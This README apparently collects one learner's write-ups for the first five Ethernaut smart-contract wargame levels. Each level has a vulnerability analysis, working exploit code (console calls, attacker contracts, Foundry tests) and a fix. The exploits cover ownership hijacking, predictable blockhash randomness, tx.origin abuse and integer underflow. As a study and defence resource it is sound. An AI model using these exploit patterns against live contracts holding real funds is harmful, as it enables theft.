# OpenZeppelin Ethernaut Solutions (Foundry)

This repository contains my exploit scripts, vulnerability analyses, and Proof of Concepts (PoCs) for the OpenZeppelin Ethernaut smart contract wargame, built using the Foundry framework.

---

## Level 1: Fallback

### Objective
Claim ownership of the contract to drain its balance.

### Vulnerability Analysis
The critical vulnerability exists within the `receive()` fallback function. The developer mistakenly placed the ownership transfer logic inside this function. Because `receive()` is automatically triggered when plain Ether is sent to the contract, anyone who meets the `require` conditions can hijack the contract.

### Exploit Steps

**Method 1: Web3 Console (Browser)**
1. **Bypass the requirement:** Send a small amount of ETH to pass the `contributions[msg.sender] > 0` check.
```javascript
await contract.contribute({ value: toWei("0.0001") });
```

2. **Trigger the fallback:** Send a blank transaction with ETH to trigger the `receive()` function and claim ownership.
```javascript
await contract.sendTransaction({ value: toWei("0.0001") });
```


3. **Drain the funds:** Execute the restricted withdraw function.
```javascript
await contract.withdraw();
```



**Method 2: Foundry (PoC)**

```solidity
// Step 1: Contribute to bypass the require statement
fallbackContract.contribute{value: 0.0001 ether}();

// Step 2: Trigger receive() via a low-level call
(bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
require(success, "Transaction failed");

// Step 3: Drain the contract
fallbackContract.withdraw();
```

### Mitigation (The Fix)

Do not use fallback or `receive()` functions to handle critical state changes like ownership transfers. Ownership changes should be handled by dedicated, explicit functions protected by proper access control modifiers (like OpenZeppelin's `Ownable` contract).

---

## Level 2: Fallout

### Objective
Claim ownership of the contract.

### Vulnerability Analysis
The intended constructor function is misspelled as `Fal1out` (using the number '1') instead of `Fallout`. In older versions of Solidity (prior to 0.4.22), constructors were defined by creating a function with the exact same name as the contract. Because of this typo, the compiler treats `Fal1out()` as a regular, publicly accessible function rather than a constructor. This allows anyone to call it after deployment and overwrite the `owner` state variable.

### Exploit Steps

**Method 1: Web3 Console (Browser)**
1. **Trigger the public function:** Call the misspelled constructor to overwrite the owner variable.
```javascript
await contract.Fal1out();

```

2. **Verify ownership:** Check if your address is now the owner.

```javascript
await contract.owner();

```

**Method 2: Foundry (PoC)**

```solidity
// Step 1: Call the misspelled constructor function
falloutContract.Fal1out();

// Step 2: Verify ownership transfer (Test assertion)
assertEq(falloutContract.owner(), hacker, "Hack failed: Hacker is not the owner");

```

### Mitigation (The Fix)

Use the `constructor()` keyword introduced in Solidity 0.4.22 instead of naming the function after the contract. This prevents accidental typos from exposing critical initialization logic as regular public functions. (Note: Modern Solidity versions like 0.8.x completely removed support for contract-named constructors to eliminate this exact class of vulnerability).

### Case Study

The story of Rubixi is a very well-known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...

```

This allowed the attacker to call the old constructor, claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.

---

## Level 3: CoinFlip

### Objective
Guess the outcome of a coin flip correctly 10 consecutive times.

### Vulnerability Analysis
The smart contract attempts to generate randomness using on-chain data, specifically `blockhash(block.number - 1)`. In the Ethereum Virtual Machine (EVM), all state and block data are public and deterministic. There is no true randomness natively on-chain. 

Because of this, an attacker can write a custom smart contract that copies the exact same mathematical logic. When the attacker contract calls the target contract, both execute within the same transaction and the exact same block. The attacker contract can pre-calculate the outcome using the current block's context and then pass the guaranteed correct answer to the target. 

Additionally, the contract includes a spam protection mechanism (`if (lastHash == blockValue) revert();`), which prevents looping the attack in a single transaction. The exploit must be executed one transaction per block over 10 separate blocks.

### Exploit Steps

**Method 1: Remix IDE & Web3 (Cross-Contract Call)**
1. **Deploy the Attacker Contract:** Use Remix IDE to deploy the following `Attacker` contract, passing your Ethernaut instance address into the constructor.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface ICoinFlip {
    function flip(bool guess) external returns (bool);
}

contract Attacker {
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}

```

2. **Execute and Wait:** Call the `attack()` function on your deployed contract. **Crucial:** You must wait for the transaction to be confirmed (a new block is mined) before pressing it again, otherwise the transaction will revert due to the `lastHash` check.
3. **Repeat:** Repeat step 2 ten times. You can track your progress in the browser console using:

```javascript
(await contract.consecutiveWins()).toString()

```

**Method 2: Foundry (PoC)**

In Foundry, we can simulate the passing of time (new blocks) using the cheatcode `vm.roll()`. This allows us to bypass the `lastHash` spam protection in a single test run.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/03_CoinFilp/CoinFlip.sol";
import {Attacker} from "../src/03_CoinFilp/Attacker.sol";

contract CoinFilp_Solutions is Test {
    CoinFlip coinFlipContract;
    Attacker attackerContractl;

    address public owner;
    address public hacker;

    function setUp() public {
        owner = makeAddr("owner");
        vm.prank(owner);
        coinFlipContract = new CoinFlip();

        hacker = makeAddr("hacker");
        vm.prank(hacker);
        attackerContractl = new Attacker(address(coinFlipContract));
    }

    function test_attack() public {
        // Loop the attack 10 times
        for (uint256 i = 0; i < 10; i++) {
            // Simulate a new block being mined to bypass the 'lastHash' revert check
            vm.roll(block.number + 1);

            vm.prank(hacker);
            attackerContractl.attack();
        }

        // Verify the hack was successful
        assertEq(coinFlipContract.consecutiveWins(), 10, "Not reaching 10 consecutive wins!");
    }
}

```

### Mitigation (The Fix)

Never use on-chain data like `blockhash`, `block.timestamp`, or `block.difficulty` as a source of randomness in smart contracts. They can be manipulated by miners or easily pre-calculated by attackers. To achieve secure, cryptographically verifiable randomness on the blockchain, you must use an off-chain Oracle service, such as **Chainlink VRF (Verifiable Random Function)**.

---

## Level 4: Telephone

### Objective
Claim ownership of the contract.

### Vulnerability Analysis
The smart contract contains a critical flaw in its authorization logic. It uses `tx.origin` to verify the sender instead of `msg.sender` in the `changeOwner` function:
```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}

```

In the Ethereum Virtual Machine (EVM):

* `tx.origin` refers to the original External Owned Account (EOA) that initiated the transaction.
* `msg.sender` refers to the immediate account (or smart contract) that called the function.

By deploying an intermediary "Attacker" contract to make the call on our behalf, we create a scenario where `tx.origin` (our wallet) is different from `msg.sender` (the Attacker contract). This satisfies the `if` condition and allows us to hijack the contract's ownership. Using `tx.origin` for authorization is a common anti-pattern that leaves contracts vulnerable to Phishing attacks.

### Exploit Steps

**Method 1: Remix IDE & Web3 (Cross-Contract Call)**

1. **Deploy the Intermediary Contract:** Use Remix IDE to deploy the following `Attacker` contract, passing the Ethernaut target instance address to the constructor.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface ITelephone {
    function changeOwner(address owner) external;
}

contract Attacker {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        // msg.sender here is our wallet address.
        // We pass it to become the new owner.
        target.changeOwner(msg.sender);
    }
}

```

2. **Execute the Attack:** Call the `attack()` function on your deployed contract. Since the call goes through the Attacker contract, `tx.origin` != `msg.sender`, and ownership is transferred to you.

**Method 2: Foundry (PoC)**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../src/04_Telephone/Telephone.sol";
import {Attacker} from "../src/04_Telephone/Attacker.sol";

contract Telephone_Solutions is Test {
    Telephone TelephoneContract;
    Attacker attackerContractl;

    address public owner;
    address public hacker;

    function setUp() public {
        // 1. Owner deploys the target contract
        owner = makeAddr("owner");
        vm.prank(owner);
        TelephoneContract = new Telephone();

        // 2. Hacker deploys the attacker contract
        hacker = makeAddr("hacker");
        vm.prank(hacker);
        attackerContractl = new Attacker(address(TelephoneContract));
    }

    function test_attack() public {
        // Use vm.prank with two arguments to set both msg.sender and tx.origin to the hacker
        vm.prank(hacker, hacker);
        
        // Execute the attack
        attackerContractl.attack();

        // Verify the ownership transfer
        assertEq(TelephoneContract.owner(), hacker, "Hack failed: You are not the owner!");
    }
}

```

### Mitigation (The Fix)

Never use `tx.origin` for authorization or access control. Always use `msg.sender`. If you need to ensure that the caller is an EOA (and not a smart contract), you can use `require(tx.origin == msg.sender)`, but this should be used carefully as it breaks composability (preventing other contracts from interacting with yours).

## Level 5: Token

### Objective

Hack the basic token contract to significantly increase your initial balance of 20 tokens to a very large amount.

### Vulnerability Analysis

The critical vulnerability in this contract is an **Integer Underflow**. The contract is compiled with an older version of Solidity (`^0.6.0`), which does not have built-in protections against mathematical underflows or overflows.

The flaw exists within the `transfer` function:

```solidity
require(balances[msg.sender] - _value >= 0);
```

Because the `balances` mapping uses `uint256` (unsigned integers, which cannot be negative), subtracting a larger number from a smaller number (e.g., `20 - 21`) will not result in a negative value. Instead, it "wraps around" to the maximum possible value for a `uint256` ($2^{256} - 1$). Consequently, the `require` statement always evaluates to `true`, allowing an attacker to transfer more tokens than they actually own, underflowing their own balance to a massive number in the process.

### Exploit Steps

**Method 1: Web3 Console (Browser)**

1. **Check initial balance:** Verify you start with 20 tokens.

```javascript
(await contract.balanceOf(player)).toString()
```

2. **Trigger the underflow:** Transfer more tokens than you possess (e.g., 21) to any other address (like a dummy address or the zero address) to underflow your own balance.

```javascript
await contract.transfer("0x1111111111111111111111111111111111111111", 21);
```

3. **Verify the hack:** Check your balance again. You should now have an astronomical amount of tokens.

```javascript
(await contract.balanceOf(player)).toString()
```

**Method 2: Foundry (PoC)**

*(Note: To successfully test this in Foundry with Solidity `0.8.x`, you must wrap the math operations in the `Token.sol` target contract with an `unchecked { ... }` block to replicate the compiler behavior of version `0.6.0`)*

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/05_Token/Token.sol";

contract Token_Solutions is Test {
    Token TokenContract;

    address public owner;
    address public hacker;
    address public dummy;

    function setUp() public {
        owner = makeAddr("owner");
        
        vm.prank(owner);
        TokenContract = new Token(210000);

        hacker = makeAddr("hacker");
        dummy = makeAddr("dummy");

        // Simulate the Ethernaut environment by giving the hacker 20 initial tokens
        vm.prank(owner);
        TokenContract.transfer(hacker, 20);
    }

    function test_attack() public {
        vm.prank(hacker);
        
        // Transfer 21 tokens (1 more than the balance) to a dummy address
        // This will cause the hacker's balance to underflow
        TokenContract.transfer(dummy, 21);

        // Verify the balance underflowed to a massive number
        uint256 hackerBalance = TokenContract.balanceOf(hacker);
        assertGt(hackerBalance, 20, "Hack failed: Balance did not underflow");
    }
}
```

### Mitigation (The Fix)

To prevent integer underflow and overflow vulnerabilities:

1. **Upgrade Solidity Version (Recommended):** Compile your contracts using Solidity `0.8.0` or higher. These modern versions include built-in automatic checks that will safely revert the transaction if an arithmetic underflow or overflow occurs.
2. **Use SafeMath:** If you are restricted to using a Solidity version prior to `0.8.0`, you must use a library like OpenZeppelin's `SafeMath` for all arithmetic operations (e.g., using `balances[msg.sender].sub(_value)`). The library manually checks for overflows/underflows before executing the math.